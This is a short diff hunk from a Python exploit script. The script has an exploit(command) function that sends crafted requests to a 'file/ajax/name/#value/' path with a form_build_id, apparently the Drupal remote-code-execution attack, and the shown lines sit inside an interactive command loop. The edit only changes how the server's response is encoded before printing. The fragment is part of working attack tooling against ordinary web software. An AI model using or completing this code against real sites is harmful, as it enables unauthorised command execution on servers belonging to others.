@@ -20,7 +20,7 @@ def exploit(command):
 	    get_params = {'q':'file/ajax/name/#value/' + found}
 	    post_params = {'form_build_id':found}
 	    r = requests.post(HOST, data=post_params, params=get_params)
-	    print("\n".join(r.text.split("\n")[:-1]))
+	    print("\n".join(r.text.encode("utf-8").split("\n")[:-1]))
 
 
 while True:
